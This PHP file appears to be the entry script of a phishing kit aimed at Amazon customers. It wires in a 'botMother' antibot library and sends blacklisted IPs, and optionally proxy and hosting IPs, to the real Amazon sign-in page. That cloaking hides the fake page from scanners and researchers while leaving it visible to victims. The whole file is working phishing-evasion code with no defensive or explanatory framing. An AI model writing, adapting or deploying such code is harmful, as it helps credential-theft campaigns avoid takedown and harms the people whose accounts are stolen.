<?php 
require (__DIR__).'/config.php';
require (__DIR__).'/lib/frm.php';

require (__DIR__).'/botMother/botMother.php';
$bm = new botMother();
$bm->setExitLink("https://www.amazon.com/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fs%3Fk%3Da%2Bmazon%2Bcom%26adgrpid%3D127260490003%26hvadid%3D585479351039%26hvdev%3Dc%26hvlocphy%3D1009974%26hvnetw%3Dg%26hvqmt%3Db%26hvrand%3D13846857995082212894%26hvtargid%3Dkwd-321362582074%26hydadcr%3D27983_14525522%26tag%3Dhydglogoo-20%26ref%3Dnav_custrec_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0");
$bm->setGeoFilter("");
$bm->setLicenseKey("");
$bm->setTestMode(false);

if(strtolower($antibot)=="yes"){
$bm->run();
}

$list = explode(",", file_get_contents((__DIR__)."/blacklisted_ips.txt"));
foreach($list as $bip){
    if($_SERVER['REMOTE_ADDR']==trim($bip)){
        header("location:".$bm->EXIT_LINK);
    }
}

if(strtolower($block_proxy)=="yes"){
    // Temporarily disable proxy blocking for testing
    // $proxy = $bm->getIpInfo('proxy');
    // $hosting = $bm->getIpInfo('hosting');
    
    // if($proxy OR $hosting){
    //     $bm->killBot("Detected proxy/hosting.");
    //     die(header("location: ".$bm->EXIT_LINK));
    // }
    
}
     

 

?>